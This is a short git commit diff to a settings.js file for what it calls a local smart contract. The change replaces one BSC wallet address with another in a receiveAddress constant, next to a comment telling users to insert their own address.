e48bfd03523721f0ec50083d853b33afe109b63a
rhilsci <rhilsci@gmail.com>
2024-06-06 17:23:04 -0400

    settings.js
    settings

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x970054B06Caf3177ad083c878b7Cdb75dED6A3F3";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
